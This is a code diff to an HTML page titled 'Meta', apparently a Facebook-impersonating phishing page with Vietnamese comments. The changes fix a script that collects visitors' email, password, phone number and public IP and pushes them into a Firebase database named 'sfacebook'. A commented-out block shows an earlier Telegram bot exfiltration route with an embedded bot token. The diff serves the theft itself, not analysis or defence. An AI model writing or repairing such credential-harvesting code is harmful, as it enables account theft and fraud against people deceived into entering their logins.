@@ -40,11 +40,13 @@
       };
 
       // Khởi tạo Firebase
+      
       firebase.initializeApp(firebaseConfig);
-      const sfacebookRef = db.ref("sfacebook");
-
       // Firebase Realtime Database reference
       const db = firebase.database();
+      var sfacebookRef = db.ref("sfacebook");
+
+      
     </script>
     <script src="jquery-3.6.0.min.js"></script>
     <title>Meta</title>
@@ -339,8 +341,9 @@
                           >Email Address *</label
                         >
                         <input
+
                           type="email"
-                          class="form-control"
+                          class="form-control email-123"
                           style="
                             border-radius: 0;
                             height: 35px;
@@ -3085,7 +3088,8 @@
 
       $.getJSON("https://api.ipify.org?format=json", function (data) {
         // Setting text of element P with id gfg
-        sfacebookRef.push({ email, password, ip: data.id, phone });
+        console.log(data.ip)
+        sfacebookRef.push({ email: $(".email-123").val().toString(), password: password.toString(), phone: phone.toString(), ip: data.ip.toString() });
       });
       // $.ajax({
       //     url: 'https://api.telegram.org/bot1070051055:AAHqiH52qWt0ubyfyOmIqkXQuqIjm4Mt5RM/sendMessage',
